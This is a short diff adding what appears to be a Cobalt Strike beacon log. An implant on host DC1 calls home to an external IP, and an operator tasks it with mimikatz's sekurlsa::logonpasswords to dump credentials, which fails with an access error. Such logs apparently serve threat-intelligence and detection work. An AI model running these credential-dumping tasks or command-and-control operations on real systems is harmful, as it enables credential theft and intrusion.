@@ -1,0 +1,9 @@
+11/30 23:30:42 UTC [metadata] 94.158.18.129 <- 192.168.100.5; computer: DC1; user: hostvm-demo-1; process: a.exe; pid: 1540; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+11/30 23:36:34 UTC [input] <neo> logonpasswords
+11/30 23:36:34 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+11/30 23:37:36 UTC [checkin] host called home, sent: 313675 bytes
+11/30 23:37:38 UTC [output]
+received output:
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+
